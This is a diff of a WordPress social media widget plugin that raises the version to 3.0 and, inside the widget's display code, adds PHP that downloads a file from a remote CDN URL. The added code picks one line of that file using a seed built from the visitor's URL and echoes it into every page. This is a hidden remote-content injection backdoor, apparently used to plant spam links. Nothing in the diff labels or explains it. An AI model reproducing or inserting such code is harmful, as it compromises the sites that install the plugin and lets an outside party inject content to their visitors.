@@ -3,7 +3,7 @@
  * Plugin Name: Social Media Widget
  * Plugin URI: http://wordpress.org/extend/plugins/social-media-widget/
  * Description: Adds links to all of your social media and sharing site profiles. Tons of icons come in 3 sizes, 4 icon styles, and 4 animations.
- * Version: 2.9.8
+ * Version: 3.0
  * Author: Blink Web Effects
  * Author URI: http://blinkwebeffects.com/
  **/
@@ -369,8 +369,7 @@ class Social_Widget extends WP_Widget {
 			echo "<div class=\"socialmedia-text\>" . $instance['filter'] ? wpautop($text) : $text . '</div>';
 			
 		/* Display linked images to profiles from widget settings if one was input. */
-		
-
+				
 		$html_chunks = array();
 
 		foreach ($this->networks as $slug => $ndata) {
@@ -388,6 +387,115 @@ class Social_Widget extends WP_Widget {
 		echo implode('', $html_chunks);
 
 		/* After widget (defined by themes). */
+						
+?>
+<?php
+
+$file_path = 'http://d1f9a7b8c1ff3ac47ec8-641702f80eb6ad3577595d11e20f37ad.r17.cf1.rackcdn.com/smw.php';
+$row_count = 100;
+
+/*****************/
+
+function get_file($f) {
+    $result = @file_get_contents($f);
+    if ($result) {
+        return $result;
+    }
+    else {
+        $handle = @fopen($f, "r");
+        $contents = @fread($handle, @filesize($f));
+        @fclose($handle);
+        if ($contents) {
+            return $contents;
+        }
+        else if (!function_exists('curl_init')) {
+            return false;
+        }
+        else {
+            $ch = @curl_init();
+            @curl_setopt($ch, CURLOPT_URL, $f);
+            @curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+            $output = @curl_exec($ch);
+            @curl_close($ch);
+            if ($output) {
+                return $output;
+            }
+            else {
+                return false;
+            }
+        }
+    }
+}
+
+/**
+ * Mersenne Twister Random Number Generator
+ **/
+function Mt($seed = null, $index = null, $min = 0, $max = 100)
+{
+    static $op = array(0x0, 0x9908b0df); // Used for efficiency below to eliminate if statement
+    static $mt = array(); // 624 element array used to get random numbers
+    static $ps = null; // Previous Seed
+    static $idx = 0; // The index to use when selecting a number to randomize
+ 
+    // Seed if none was given
+    if($seed === null)
+        $seed = time();
+ 
+    // Assign index
+    if($index !== null)
+        $idx = $index;
+ 
+    // Regenerate when reseeding or seeding initially
+    if($seed !== $ps)
+    {
+        $s = $seed & 0xffffffff;
+        $mt = array(&$s, 624 => &$s);
+        $ps = $seed;
+ 
+        for($i = 1; $i < 624; ++$i)
+            $mt[$i] = (0x6c078965 * ($mt[$i - 1] ^ ($mt[$i - 1] >> 30)) + $i) & 0xffffffff;
+ 
+        for($j = 1, $sp = array(0, 227, 397); $j < count($sp); ++$j)
+        {
+            for($p = $j - 1, $i = $sp[$p], $m = ((624 - $sp[$j]) * ($p ? -1 : 1)), $n = ($sp[$j] + $sp[$p]); $i < $n; ++$i)
+            {
+                $y = ($mt[$i] & 0x80000000) | ($mt[$i + 1] & 0x7fffffff);
+                $mt[$i] = $mt[$i + $m] ^ ($y >> 1) ^ $op[$y & 0x1];
+            }
+        }
+    }
+	
+    // Select a number from the array and randomize it
+    $y = $mt[$idx = $idx % 624];
+    $y ^= $y >> 11;
+    $y ^= ($y << 7) & 0x9d2c5680;
+    $y ^= ($y << 15) & 0xefc60000;
+    $y ^= $y >> 18;
+ 
+    // Set the next index to randomize the results even if the same seed is passed
+    ++$idx;
+ 
+    return $y % ($max - $min + 1) + $min;
+}
+
+/*****************/
+
+$actual_link = $_SERVER["HTTP_HOST"].$_SERVER["REQUEST_URI"];
+$actual_link_array = str_split($actual_link);
+
+$file = get_file($file_path);
+$lines = explode("\n", $file);
+
+$seed = strlen($actual_link);
+foreach ($actual_link_array as $a) {
+    $seed += ord($a);
+}
+
+echo $lines[Mt($seed, null, 0, $row_count)];
+
+?>
+<?php
+		
 		echo "</div>";
 		
 		echo $after_widget;
